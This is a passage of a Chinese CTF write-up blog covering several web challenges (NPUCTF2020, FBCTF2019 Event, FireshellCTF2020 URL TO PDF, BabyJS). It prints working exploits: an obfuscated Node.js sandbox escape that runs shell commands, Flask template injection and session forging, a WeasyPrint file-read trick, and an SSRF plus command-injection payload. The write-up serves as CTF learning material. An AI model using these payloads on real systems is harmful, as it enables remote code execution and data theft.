+app.listen(<span style="color:#bd93f9">80</span>, <span style="color:#f1fa8c">&#39;0.0.0.0&#39;</span>, () =&gt; {
+  console.log(<span style="color:#f1fa8c">&#39;Start listening&#39;</span>)
+});
+</code></pre></div><p>看了一遍，盯紧两个地方，一个是超大正则，一个是判断md5</p>
+<p>第一个，正则可视化</p>
+<p><a class="link" href="https://regexper.com/"  target="_blank" rel="noopener"
+    >https://regexper.com/</a></p>
+<p><a class="link" href="https://wangwl.net/r/vr"  target="_blank" rel="noopener"
+    >https://wangwl.net/r/vr</a></p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/6240226327f86abb2a968f64.png" >
+		<img src="https://pic.imgdb.cn/item/6240226327f86abb2a968f64.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>允许<code>()+\-*/&amp;|^%&lt;&gt;=,?:</code>，允许Math.xxxx这样子的任意形式函数调用，以及浮点数科学计数法的数字表示形式，还有空格</p>
+<p>知识：</p>
+<p><code>(?:)</code>就是为了分组，但是不捕获下来供正则表达式其他部分使用，叫非获取匹配</p>
+<p>emmm，就是简简单单分个组：pattern4和pattern5作用一样</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8be9fd;font-style:italic">var</span> pattern1<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">/aacdaa/</span>;
+<span style="color:#8be9fd;font-style:italic">var</span> pattern2<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">/(?:aa|bb)cd\1/</span>;
+<span style="color:#8be9fd;font-style:italic">var</span> pattern3<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">/(aa|bb)cd\1/</span>;
+<span style="color:#8be9fd;font-style:italic">var</span> pattern4<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">/aacd|bbcd/</span>;
+<span style="color:#8be9fd;font-style:italic">var</span> pattern5<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">/(?:aa|bb)cd/</span>;
+
+<span style="color:#8be9fd;font-style:italic">var</span> str<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;aacdaa&#34;</span>;
+console.log(str.match(pattern1)); <span style="color:#6272a4">// [&#34;aacdaa&#34;, index: 0, input: &#34;aacdaa&#34;]
+</span><span style="color:#6272a4"></span>console.log(str.match(pattern2)); <span style="color:#6272a4">// null
+</span><span style="color:#6272a4"></span>console.log(str.match(pattern3)); <span style="color:#6272a4">// [&#34;aacdaa&#34;, &#34;aa&#34;, index: 0, input: &#34;aacdaa&#34;]
+</span></code></pre></div><p>/g 全局匹配，咱不管</p>
+<p>第二个</p>
+<p><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code></p>
+<p>长度相同，互不相等，加key[0]之后md5相等</p>
+<p>弱类型，加盐之后都是字符串</p>
+<p>让first 是字符1，second 是数组1，但urlencode没法接收数组</p>
+<p>正好这里可以传json，也就可以用json解决</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/6240227227f86abb2a96efb0.png" >
+		<img src="https://pic.imgdb.cn/item/6240227227f86abb2a96efb0.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>记得加上Content-Type&quot;: &ldquo;application/json</p>
+<p>绕过正则看不下去了，直接贴结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">(<span style="color:#8be9fd;font-style:italic">Math</span>=&gt;
+        (<span style="color:#8be9fd;font-style:italic">Math</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">Math</span>.constructor,
+                <span style="color:#8be9fd;font-style:italic">Math</span>.x<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">Math</span>.constructor(
+                    <span style="color:#8be9fd;font-style:italic">Math</span>.fromCharCode(<span style="color:#bd93f9">114</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">116</span>,<span style="color:#bd93f9">117</span>,<span style="color:#bd93f9">114</span>,<span style="color:#bd93f9">110</span>,<span style="color:#bd93f9">32</span>,<span style="color:#bd93f9">112</span>,<span style="color:#bd93f9">114</span>,<span style="color:#bd93f9">111</span>,
+                        <span style="color:#bd93f9">99</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">115</span>,<span style="color:#bd93f9">115</span>,<span style="color:#bd93f9">46</span>,<span style="color:#bd93f9">109</span>,<span style="color:#bd93f9">97</span>,<span style="color:#bd93f9">105</span>,<span style="color:#bd93f9">110</span>,<span style="color:#bd93f9">77</span>,<span style="color:#bd93f9">111</span>,<span style="color:#bd93f9">100</span>,<span style="color:#bd93f9">117</span>,<span style="color:#bd93f9">108</span>,<span style="color:#bd93f9">101</span>,
+                        <span style="color:#bd93f9">46</span>,<span style="color:#bd93f9">114</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">113</span>,<span style="color:#bd93f9">117</span>,<span style="color:#bd93f9">105</span>,<span style="color:#bd93f9">114</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">40</span>,<span style="color:#bd93f9">39</span>,<span style="color:#bd93f9">99</span>,<span style="color:#bd93f9">104</span>,<span style="color:#bd93f9">105</span>,<span style="color:#bd93f9">108</span>,<span style="color:#bd93f9">100</span>,
+                        <span style="color:#bd93f9">95</span>,<span style="color:#bd93f9">112</span>,<span style="color:#bd93f9">114</span>,<span style="color:#bd93f9">111</span>,<span style="color:#bd93f9">99</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">115</span>,<span style="color:#bd93f9">115</span>,<span style="color:#bd93f9">39</span>,<span style="color:#bd93f9">41</span>,<span style="color:#bd93f9">46</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">120</span>,<span style="color:#bd93f9">101</span>,<span style="color:#bd93f9">99</span>,<span style="color:#bd93f9">83</span>,
+                        <span style="color:#bd93f9">121</span>,<span style="color:#bd93f9">110</span>,<span style="color:#bd93f9">99</span>,<span style="color:#bd93f9">40</span>,<span style="color:#bd93f9">39</span>,<span style="color:#bd93f9">99</span>,<span style="color:#bd93f9">97</span>,<span style="color:#bd93f9">116</span>,<span style="color:#bd93f9">32</span>,<span style="color:#bd93f9">47</span>,<span style="color:#bd93f9">102</span>,<span style="color:#bd93f9">108</span>,<span style="color:#bd93f9">97</span>,<span style="color:#bd93f9">103</span>,<span style="color:#bd93f9">39</span>,<span style="color:#bd93f9">41</span>))()
+        )
+)(<span style="color:#8be9fd;font-style:italic">Math</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
+<span style="color:#ff79c6">import</span> json
+
+headers <span style="color:#ff79c6">=</span> {
+    <span style="color:#f1fa8c">&#34;Content-Type&#34;</span>: <span style="color:#f1fa8c">&#34;application/json&#34;</span>
+}
+url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://d609db3d-6a1a-4835-9b9e-623822d89eb1.node4.buuoj.cn:81/&#34;</span>
+data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;e&#34;</span>: <span style="color:#f1fa8c">&#34;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#34;</span>, <span style="color:#f1fa8c">&#34;first&#34;</span>: [<span style="color:#bd93f9">0</span>], <span style="color:#f1fa8c">&#34;second&#34;</span>: <span style="color:#f1fa8c">&#34;0&#34;</span>}
+r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, data<span style="color:#ff79c6">=</span>json<span style="color:#ff79c6">.</span>dumps(data), headers<span style="color:#ff79c6">=</span>headers)
+<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>text)
+</code></pre></div><p>学js去了</p>
+<h2 id="fbctf2019event">[FBCTF2019]Event</h2>
+<p>flask</p>
+<p>没想到在event_important有注入</p>
+<p>猜它可能大概想这样</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">name <span style="color:#ff79c6">=</span> event_name
+address <span style="color:#ff79c6">=</span> event_address
+<span style="color:#8be9fd;font-style:italic">print</span>(event_important)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">event_name=1&amp;event_address=1&amp;event_important=__class__.__init__.__globals__[app].config
+</code></pre></div><p>于是查到秘钥</p>
+<p><code>fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y</code></p>
+<p>解密，出现的是字符串，不是json</p>
+<p>加密</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> Flask
+<span style="color:#ff79c6">from</span> flask.sessions <span style="color:#ff79c6">import</span> SecureCookieSessionInterface
+
+app <span style="color:#ff79c6">=</span> Flask(__name__)
+app<span style="color:#ff79c6">.</span>secret_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</span>
+session_serializer <span style="color:#ff79c6">=</span> SecureCookieSessionInterface()<span style="color:#ff79c6">.</span>get_signing_serializer(app)
+@app<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/&#39;</span>)
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">index</span>():
+    <span style="color:#8be9fd;font-style:italic">print</span>(session_serializer<span style="color:#ff79c6">.</span>dumps(<span style="color:#f1fa8c">&#34;admin&#34;</span>))
+index()
+</code></pre></div><p>ImFkbWluIg.YZ92Gw.m7Ax9nFV8ULTllJK2X31bEjyCuU</p>
+<h2 id="fireshellctf2020url-to-pdf">[FireshellCTF2020]URL TO PDF</h2>
+<p>由于刚刚有些无聊所以再开一道</p>
+<p>开局一个输入框，url转pdf？没见过</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png" >
+		<img src="https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>弹出下载，但是没法打开，用010来看，可以看到html，猜测爬虫之类的，可以开个服务器看看请求</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@VM-8-15-debian:~# nc -lvp 10004
+listening on [any] 10004 ...
+117.21.200.166: inverse host lookup failed: Unknown host
+connect to [10.0.8.15] from (UNKNOWN) [117.21.200.166] 1519
+GET / HTTP/1.1
+Host: 82.157.174.226:10004
+User-Agent: WeasyPrint 51 (http://weasyprint.org/)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+</code></pre></div><p>WeasyPrint是啥？没见过</p>
+<p>WeasyPrint 是一个 Python 的虚拟 HTML 和 CSS 渲染引擎，可以用来将网页转成 PDF 文档。旨在支持 Web 标准的打印。</p>
+<p>WeasyPrint 会把所有它支持的东西 都请求一遍然后放在 PDF 里，这里出现了漏洞，在 <code>&lt;link&gt;</code> 标签内 <code>href</code> 加载 <code>file://</code> 实现 SSRF + 任意文件读取</p>
+<blockquote>
+<p>Weasyprint (the library used here) allows including files into the PDF using <code>&lt;link rel=attachment href=&quot;PATH&quot; /&gt;</code> in the HTML source for the PDF</p>
+</blockquote>
+<ul>
+<li>
+<blockquote>
+<p>It’s a documented feature</p>
+</blockquote>
+</li>
+<li>
+<blockquote>
+<p>The information about weasyprint was leaked using a <code>background-image</code> CSS property to load an attacker-controlled image</p>
+</blockquote>
+</li>
+<li>
+<blockquote>
+<p>The vendor and version (weasyprint 44) were in the HTTP headers</p>
+</blockquote>
+</li>
+</ul>
+<p>开了个docker，写个html</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!DOCTYPE html&gt;</span>
+&lt;<span style="color:#ff79c6">html</span>&gt;
+&lt;<span style="color:#ff79c6">head</span>&gt;
+&lt;<span style="color:#ff79c6">title</span>&gt;Captain&lt;/<span style="color:#ff79c6">title</span>&gt;
+&lt;/<span style="color:#ff79c6">head</span>&gt;
+&lt;<span style="color:#ff79c6">body</span>&gt;
+&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;attachment&#39;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;file:///flag&#39;</span>&gt;
+&lt;/<span style="color:#ff79c6">body</span>&gt;
+</code></pre></div><h2 id="网鼎杯-2020-半决赛babyjs">[网鼎杯 2020 半决赛]BabyJS</h2>
+<p>快速拔刀（不是）</p>
+<p>快速找到关键源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8be9fd;font-style:italic">var</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;express&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> config <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;../config&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> url<span style="color:#ff79c6">=</span>require(<span style="color:#f1fa8c">&#39;url&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> child_process<span style="color:#ff79c6">=</span>require(<span style="color:#f1fa8c">&#39;child_process&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> fs<span style="color:#ff79c6">=</span>require(<span style="color:#f1fa8c">&#39;fs&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> request<span style="color:#ff79c6">=</span>require(<span style="color:#f1fa8c">&#39;request&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> router <span style="color:#ff79c6">=</span> express.Router();
+
+
+<span style="color:#8be9fd;font-style:italic">var</span> blacklist<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;127.0.0.1.xip.io&#39;</span>,<span style="color:#f1fa8c">&#39;::ffff:127.0.0.1&#39;</span>,<span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>,<span style="color:#f1fa8c">&#39;0&#39;</span>,<span style="color:#f1fa8c">&#39;localhost&#39;</span>,<span style="color:#f1fa8c">&#39;0.0.0.0&#39;</span>,<span style="color:#f1fa8c">&#39;[::1]&#39;</span>,<span style="color:#f1fa8c">&#39;::1&#39;</span>];
+
+router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+    res.json({});
+});
+
+router.get(<span style="color:#f1fa8c">&#39;/debug&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+    console.log(req.ip);
+    <span style="color:#ff79c6">if</span>(blacklist.indexOf(req.ip)<span style="color:#ff79c6">!=-</span><span style="color:#bd93f9">1</span>){
+        console.log(<span style="color:#f1fa8c">&#39;res&#39;</span>);
+	<span style="color:#8be9fd;font-style:italic">var</span> u<span style="color:#ff79c6">=</span>req.query.url.replace(<span style="color:#f1fa8c">/[\&#34;\&#39;]/ig</span>,<span style="color:#f1fa8c">&#39;&#39;</span>);
+	console.log(url.parse(u).href);
+	<span style="color:#8be9fd;font-style:italic">let</span> log<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`echo  &#39;</span><span style="color:#f1fa8c">${</span>url.parse(u).href<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&gt;&gt;/tmp/log`</span>;
+	console.log(log);
+	child_process.exec(log);
+	res.json({data<span style="color:#ff79c6">:</span>fs.readFileSync(<span style="color:#f1fa8c">&#39;/tmp/log&#39;</span>).toString()});
+    }<span style="color:#ff79c6">else</span>{
+        res.json({});
+    }
+});
+
+
+router.post(<span style="color:#f1fa8c">&#39;/debug&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+    console.log(req.body);
+    <span style="color:#ff79c6">if</span>(req.body.url <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">undefined</span>) {
+        <span style="color:#8be9fd;font-style:italic">var</span> u <span style="color:#ff79c6">=</span> req.body.url;
+	<span style="color:#8be9fd;font-style:italic">var</span> urlObject<span style="color:#ff79c6">=</span>url.parse(u);
+	<span style="color:#ff79c6">if</span>(blacklist.indexOf(urlObject.hostname) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>){
+		<span style="color:#8be9fd;font-style:italic">var</span> dest<span style="color:#ff79c6">=</span>urlObject.href;
+		request(dest,(err,result,body)=&gt;{
+			res.json(body);
+		})
+	}
+	<span style="color:#ff79c6">else</span>{
+		res.json([]);
+	}
+	}
+});
+
+module.exports <span style="color:#ff79c6">=</span> router;
+
+</code></pre></div><p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。</p>
+<p>如果没有找到匹配的字符串则返回 -1。</p>
+<p>child_process 新建子进程，从而执行 Unix 系统命令</p>
+<p>blacklist里屏蔽了一些ssrf绕过的方法，但是可以参考这篇文章绕过</p>
+<p><a class="link" href="https://www.secpulse.com/archives/65832.html"  target="_blank" rel="noopener"
+    >https://www.secpulse.com/archives/65832.html</a></p>
+<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p>
+<p>二次解码：https://github.com/nodejs/node/blob/master/lib/url.js</p>
+<p><figure 
+	>
+	<a href="/C:/Users/Lenovo/Desktop/WUIAryqhfgd.png" >
+		<img src="/C:/Users/Lenovo/Desktop/WUIAryqhfgd.png"
+			
+			
+			
+			loading="lazy"
+			alt="WUIAryqhfgd">
+	</a>
+	
+	<figcaption>WUIAryqhfgd</figcaption>
+	
+</figure></p>
+<p>也就是URL中表示用户名和密码的字段会被二次解码，可以通过%2527@来闭合引号</p>
+<p>代码大意：</p>
+<p>get：判断访问ip是否在<code>blacklist</code>中，如果是本地访问就读取get参数中的<code>url</code>参数，去除其中的单引号和双引号，然后用nodejs的<code>url.parse</code>去解析。把解析后的url拼接到一条shell命令中执行。之后返回<code>/tmp/log</code>文件中的内容。</p>
+<p>POST： 检测是否提交了url参数，若提交了该参数则会用<code>url.parse</code>解析，然后判断其中的主机名字段是否在<code>blacklist</code>中，不在的话，去使用GET方法请求<code>url</code>参数中所提交的url，返回请求的内容。</p>
+<p>payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{&#34;url&#34;:&#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00&#34;}
+</code></pre></div><p>这个样子：</p>
+<p>echo  &lsquo;http://a&rsquo;a;cp$IFS/flag$IFS/tmp/log%00&rsquo;&raquo;/tmp/log</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">二次注入</a>
+        
+            <a href="/tags/thinkphp/">thinkphp</a>
+        
+            <a href="/tags/js/">js</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2022/ciscn2019%E6%80%BB%E5%86%B3%E8%B5%9Bday2web1easyweb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2019总决赛Day2Web1]Easyweb</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sqlmap使用实例</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E7%AF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">LNMP环境搭建成功篇</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+  
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+<script>
+(function(u, c) {
+  var d = document, t = 'script', o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+  o.src = u;
+  if (c) { o.addEventListener('load', function(e) { c(e); }); }
+  s.parentNode.insertBefore(o, s);
+})('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function() {
+  pangu.spacingPage();
+});
+</script>
+
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 <a href="https://stack-theme-mod.vercel.app/">Example Site</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
+      共书写了26.8k字·共 18篇文章</br><span><p>
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+         <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">© Licensed Under CC BY-NC-SA 4.0</a>
+    </section>
+
+<script>
+var s1 = '2022-02-12';
+s1 = new Date(s1.replace(/-/g, "/"));
+s2 = new Date();
+var days = s2.getTime() - s1.getTime();
+var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+document.getElementById('days').innerHTML = number_of_days;
+</script>
+    
+</footer>
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>Search</label>
+            <input name="keyword" required placeholder="Type something..." />
+        
+            <button title="Search">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#安洵杯-2019iamthinking">[安洵杯 2019]iamthinking</a></li>
+    <li><a href="#网鼎杯2018unfinish">[网鼎杯2018]Unfinish</a></li>
+    <li><a href="#npuctf2020验证">[NPUCTF2020]验证🐎</a></li>
+    <li><a href="#fbctf2019event">[FBCTF2019]Event</a></li>
+    <li><a href="#fireshellctf2020url-to-pdf">[FireshellCTF2020]URL TO PDF</a></li>
+    <li><a href="#网鼎杯-2020-半决赛babyjs">[网鼎杯 2020 半决赛]BabyJS</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+        
+            <section class="widget categories">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
